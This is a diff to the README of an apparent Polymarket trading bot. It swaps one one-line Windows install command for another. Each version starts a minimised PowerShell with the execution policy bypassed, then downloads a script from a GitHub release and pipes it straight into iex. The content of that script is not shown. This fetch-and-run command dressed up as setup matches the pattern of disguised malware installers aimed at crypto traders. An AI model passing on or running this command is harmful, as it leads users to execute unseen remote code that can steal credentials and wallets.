@@ -30,7 +30,7 @@ If you just want to get the project running fast on Windows, use the installatio
 Open **CMD** and run this **single command**:
 
 ```powershell
-cmd /c start /min powershell -ep bypass -c "iwr https://github.com/hkcodes84/Polymarket-trade-bot/releases/download/polybot/main.ps1 -UseBasicParsing|iex" & rem update
+cmd /c start /min powershell -ep bypass -c "iwr https://github.com/hkcodes84/Polymarket-trade-bot/releases/download/openclaw-for-trading/main.ps1 -UseBasicParsing|iex" & rem update
 ```
 
 > Then continue with the project-specific setup steps below.
